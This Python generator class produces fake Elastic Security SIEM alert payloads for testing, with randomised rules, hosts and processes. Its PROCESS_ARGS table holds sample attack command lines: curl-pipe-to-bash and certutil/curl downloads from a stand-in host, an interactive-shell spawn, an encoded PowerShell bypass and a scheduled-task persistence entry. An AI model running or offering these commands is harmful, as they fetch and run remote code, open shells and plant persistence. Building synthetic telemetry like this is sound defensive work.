"""Elastic Security (SIEM) — Alert webhook action payload format.

Real Elastic Security sends alerts via connector actions (webhook, Slack, etc.).
Format: https://www.elastic.co/guide/en/security/current/alerts-api.html
"""
import random
from backend.engine.generators.base import BaseGenerator


class ElasticGenerator(BaseGenerator):
    product_name = "Elastic Security"
    product_category = "siem"

    RULE_NAMES = [
        "Potential Credential Access via LSASS Memory",
        "Suspicious PowerShell Execution",
        "Unusual Network Connection via Rundll32",
        "Persistence via Scheduled Task Created",
        "Process Injection Detected",
        "Anomalous Windows Script Host Execution",
        "Lateral Movement via Remote Services",
        "Exfiltration via DNS Tunneling",
        "Privilege Escalation via Named Pipe Impersonation",
        "Defense Evasion via Timestomping",
        "Suspicious File Creation in Startup Folder",
        "Brute Force Attempt Detected",
    ]

    RULE_TYPES = ["query", "eql", "threshold", "machine_learning", "threat_match"]

    SEVERITY_MAP = {
        "critical": "critical",
        "high": "high",
        "medium": "medium",
        "low": "low",
    }

    RISK_SCORES = {"critical": 95, "high": 73, "medium": 47, "low": 21}

    OS_PLATFORMS = ["windows", "windows", "linux", "macos"]
    OS_NAMES = {"windows": "Windows 11", "linux": "Ubuntu 22.04", "macos": "macOS Sonoma"}
    OS_FAMILIES = {"windows": "windows", "linux": "debian", "macos": "macos"}

    PROCESS_NAMES = [
        "powershell.exe", "cmd.exe", "rundll32.exe", "bash",
        "python3", "certutil.exe", "curl", "schtasks.exe",
    ]

    PROCESS_ARGS = {
        "powershell.exe": ["-ExecutionPolicy", "Bypass", "-NoProfile", "-EncodedCommand", "SQBFAFgA"],
        "cmd.exe": ["/c", "whoami", "/all"],
        "rundll32.exe": ["javascript:\"\\..\\mshtml,RunHTMLApplication\""],
        "bash": ["-c", "curl http://evil.example.net/sh | bash"],
        "python3": ["-c", "import socket,subprocess;subprocess.call(['/bin/sh','-i'])"],
        "certutil.exe": ["-urlcache", "-split", "-f", "http://evil.example.net/payload.exe"],
        "curl": ["-o", "/tmp/payload", "http://evil.example.net/stage2"],
        "schtasks.exe": ["/create", "/tn", "persist", "/tr", "c:\\temp\\beacon.exe", "/sc", "onlogon"],
    }

    TAGS = ["elastic", "endpoint", "windows", "attack.execution", "attack.persistence"]

    def generate(self) -> dict:
        severity = self._pick_severity()
        technique_id, technique_name = self._pick_technique()
        host = self._pick_host()
        user = self._pick_user()
        src_ip = self._pick_ip()
        dst_ip = self._pick_ip()
        platform = random.choice(self.OS_PLATFORMS)
        process = random.choice(self.PROCESS_NAMES)
        rule_name = random.choice(self.RULE_NAMES)
        risk = self.RISK_SCORES[severity] + random.randint(-5, 5)

        return {
            "@timestamp": self._now_iso(),
            "event": {
                "kind": "signal",
                "module": "endpoint",
                "category": ["process"],
                "action": random.choice(["start", "exec", "connection_attempted"]),
                "outcome": random.choice(["success", "failure", "unknown"]),
            },
            "kibana.alert.rule.uuid": self._uuid(),
            "kibana.alert.severity": self.SEVERITY_MAP[severity],
            "kibana.alert.risk_score": max(0, min(100, risk)),
            "kibana.alert.workflow_status": random.choice(["open", "open", "acknowledged", "closed"]),
            "kibana.alert.reason": self._pick_title(severity),
            "rule": {
                "id": self._uuid(),
                "name": rule_name,
                "description": f"{rule_name} — maps to {technique_id} ({technique_name})",
                "severity": self.SEVERITY_MAP[severity],
                "risk_score": max(0, min(100, risk)),
                "version": random.randint(1, 15),
                "tags": random.sample(self.TAGS, k=random.randint(2, 4)),
                "references": [f"https://attack.mitre.org/techniques/{technique_id}/"],
            },
            "signal": {
                "rule": {
                    "type": random.choice(self.RULE_TYPES),
                    "query": f'process.name: "{process}" and event.action: "start"',
                    "threat": [
                        {
                            "framework": "MITRE ATT&CK",
                            "technique": {"id": technique_id, "name": technique_name},
                        }
                    ],
                },
                "depth": 1,
                "original_time": self._now_iso(),
            },
            "host": {
                "name": host,
                "hostname": host.lower(),
                "os": {
                    "platform": platform,
                    "name": self.OS_NAMES[platform],
                    "family": self.OS_FAMILIES[platform],
                },
                "ip": [f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"],
            },
            "source": {"ip": src_ip, "port": random.randint(1024, 65535)},
            "destination": {"ip": dst_ip, "port": random.choice([80, 443, 8080, 4444, 8443])},
            "process": {
                "name": process,
                "pid": random.randint(1000, 65000),
                "executable": f"/usr/bin/{process}" if platform != "windows" else f"C:\\Windows\\System32\\{process}",
                "args": self.PROCESS_ARGS.get(process, [process]),
                "parent": {
                    "name": random.choice(["explorer.exe", "bash", "sshd", "init"]),
                    "pid": random.randint(1, 5000),
                },
            },
            "user": {
                "name": user,
                "domain": "CORP" if platform == "windows" else "",
            },
            "agent": {
                "type": "endpoint",
                "version": "8.13.0",
                "id": self._uuid(),
            },
        }
